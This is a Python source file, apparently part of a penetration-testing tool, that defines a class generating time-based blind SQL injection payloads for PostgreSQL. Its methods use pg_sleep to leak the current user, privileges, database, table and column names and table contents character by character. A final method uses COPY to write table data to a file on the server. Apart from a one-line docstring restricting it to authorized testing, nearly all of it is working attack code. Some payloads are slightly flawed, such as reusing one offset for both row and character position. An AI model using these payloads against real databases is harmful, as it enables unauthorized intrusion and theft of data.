"""
File that generates SQLi payloads.

Author: Aleksa Zatezalo
Date: January 2025
"""

class PostgresPayloadGenerator:
    """
    A class to generate PostgreSQL-specific SQL injection payloads for time-based attacks.
    
    This class provides methods to generate various SQL injection payloads specifically
    crafted for PostgreSQL databases. The payloads use pg_sleep() for time-based boolean
    conditions and are designed to extract information through binary search techniques.
    
    The payloads can be used to:
    - Extract database names from pg_database
    - Extract table names from pg_tables
    - Extract column names from information_schema.columns
    - Extract data from specific tables and columns
    - Copy data to files using PostgreSQL COPY command
    
    Attributes:
        sleep_time (int): The number of seconds to use in pg_sleep() calls
    
    Example:
        generator = PostgresPayloadGenerator()
        generator.set_sleep_time(3)
        payload = generator.db_names_payload(1)
        
    Security Note:
        The payloads generated by this class are intended for authorized security
        testing only. Use against systems without proper authorization is prohibited.
    """
     
    def __init__(self):
        self.sleep_time = 3  # Default sleep time for time-based attacks
        
    def set_sleep_time(self, seconds: int):
        """Set the sleep time for time-based attacks"""
        self.sleep_time = seconds
    
    def current_user_payload(self, char_pos: int, char: str) -> str:
        """
        Generate payload to extract current database user.
        
        Args:
            char_pos (int): Position of character to check
            char (str): Character to check for at position
            
        Returns:
            str: SQL injection payload for user extraction
        """
        return f"""
        ' AND (SELECT CASE WHEN (
            SELECT substr(current_user,{char_pos},1)='{char}'
        ) 
        THEN pg_sleep({self.sleep_time})
        ELSE pg_sleep(0)
        END)--
        """

    def current_privileges_payload(self, char_pos: int, char: str) -> str:
        """
        Generate payload to extract current user's privileges.
        
        Args:
            char_pos (int): Position of character to check
            char (str): Character to check for at position
            
        Returns:
            str: SQL injection payload for privilege extraction
        """
        return f"""
        ' AND (SELECT CASE WHEN (
            SELECT substr(string_agg(privilege_type, ','),{char_pos},1) 
            FROM information_schema.role_table_grants 
            WHERE grantee = current_user
        )='{char}'
        THEN pg_sleep({self.sleep_time})
        ELSE pg_sleep(0)
        END)--
        """

    def db_names_payload(self, offset: int) -> str:
        """Generate payload to extract database names"""
        return f"""
        ';SELECT CASE WHEN (
            SELECT ascii(substr(datname,{offset},1))
            FROM pg_database
            LIMIT 1 OFFSET {offset}
        ) > 0
        THEN pg_sleep({self.sleep_time})
        ELSE pg_sleep(0)
        END--
        """

    def table_names_payload(self, db_name: str, offset: int) -> str:
        """Generate payload to extract table names"""
        return f"""
        ';SELECT CASE WHEN (
            SELECT ascii(substr(tablename,{offset},1))
            FROM pg_tables
            WHERE schemaname = 'public'
            LIMIT 1 OFFSET {offset}
        ) > 0
        THEN pg_sleep({self.sleep_time})
        ELSE pg_sleep(0)
        END--
        """

    def column_names_payload(self, table_name: str, offset: int) -> str:
        """Generate payload to extract column names"""
        return f"""
        ';SELECT CASE WHEN (
            SELECT ascii(substr(column_name,{offset},1))
            FROM information_schema.columns
            WHERE table_name = '{table_name}'
            LIMIT 1 OFFSET {offset}
        ) > 0
        THEN pg_sleep({self.sleep_time})
        ELSE pg_sleep(0)
        END--
        """

    def data_extraction_payload(self, table_name: str, column_name: str, offset: int) -> str:
        """Generate payload to extract data from specific column"""
        return f"""
        ';SELECT CASE WHEN (
            SELECT ascii(substr(CAST({column_name} as varchar),{offset},1))
            FROM {table_name}
            LIMIT 1 OFFSET {offset}
        ) > 0
        THEN pg_sleep({self.sleep_time})
        ELSE pg_sleep(0)
        END--
        """

    def binary_search_payload(self, query: str, char_pos: int, ascii_val: int) -> str:
        """Generate payload for binary search of character value"""
        return f"""
        ';SELECT CASE WHEN (
            SELECT ascii(substr(({query}),{char_pos},1)) > {ascii_val}
        )
        THEN pg_sleep({self.sleep_time})
        ELSE pg_sleep(0)
        END--
        """

    def data_copy_payload(self, table_name: str, output_path: str) -> str:
        """Generate payload to copy table data to file"""
        return f"""
        ';COPY {table_name} TO '{output_path}' WITH CSV HEADER;--
        """